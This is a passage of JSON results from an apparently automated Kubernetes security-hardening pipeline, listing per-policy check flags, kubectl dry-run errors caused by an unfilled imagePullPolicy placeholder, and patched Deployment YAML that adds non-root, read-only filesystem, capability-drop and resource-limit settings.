      "kubectl dry-run failed: The Deployment \"openmcp-analytic-engine\" is invalid: spec.template.spec.containers[0].imagePullPolicy: Unsupported value: \"REPLACE_DOCKERIMAGEPULLPOLICY\": supported values: \"Always\", \"IfNotPresent\", \"Never\""
    ]
  },
  {
    "id": "01277",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"openmcp-analytic-engine\" is invalid: spec.template.spec.containers[0].imagePullPolicy: Unsupported value: \"REPLACE_DOCKERIMAGEPULLPOLICY\": supported values: \"Always\", \"IfNotPresent\", \"Never\""
    ]
  },
  {
    "id": "01278",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"openmcp-analytic-engine\" is invalid: spec.template.spec.containers[0].imagePullPolicy: Unsupported value: \"REPLACE_DOCKERIMAGEPULLPOLICY\": supported values: \"Always\", \"IfNotPresent\", \"Never\""
    ]
  },
  {
    "id": "01279",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"openmcp-analytic-engine\" is invalid: spec.template.spec.containers[0].imagePullPolicy: Unsupported value: \"REPLACE_DOCKERIMAGEPULLPOLICY\": supported values: \"Always\", \"IfNotPresent\", \"Never\""
    ]
  },
  {
    "id": "01280",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    control-plane: controller-manager\n  name: special-resource-controller-manager\n  namespace: openshift-special-resource-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  template:\n    metadata:\n      labels:\n        control-plane: controller-manager\n    spec:\n      containers:\n      - args:\n        - --secure-listen-address=0.0.0.0:8443\n        - --upstream=http://127.0.0.1:8080/\n        - --logtostderr=true\n        - --v=10\n        - --tls-cert-file=/etc/secrets/tls.crt\n        - --tls-private-key-file=/etc/secrets/tls.key\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\n        image: registry.redhat.io/openshift4/ose-kube-rbac-proxy:stable\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          limits:\n            cpu: 500m\n            memory: 128Mi\n          requests:\n            cpu: 250m\n            memory: 64Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /etc/secrets\n          name: special-resource-operator-tls\n      - args:\n        - --metrics-addr=127.0.0.1:8080\n        - --enable-leader-election\n        command:\n        - /manager\n        env:\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: SSL_CERT_DIR\n          value: /etc/pki/tls/certs\n        image: quay.io/openshift-psap/special-resource-operator:chart-as-asset\n        imagePullPolicy: Always\n        name: manager\n        resources:\n          limits:\n            cpu: 300m\n            memory: 500Mi\n          requests:\n            cpu: 300m\n            memory: 500Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /cache\n          name: cache-volume\n      securityContext:\n        runAsGroup: 499\n        runAsNonRoot: true\n        runAsUser: 499\n      volumes:\n      - name: special-resource-operator-tls\n        secret:\n          secretName: special-resource-operator-tls\n      - emptyDir: {}\n        name: cache-volume\n",
    "errors": []
  },
  {
    "id": "01281",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01282",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01283",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01284",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01285",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01286",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        - name: PODINFO_UI_MESSAGE\n          value: Hello from the pod\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01287",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01288",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01289",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01290",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01291",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01292",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
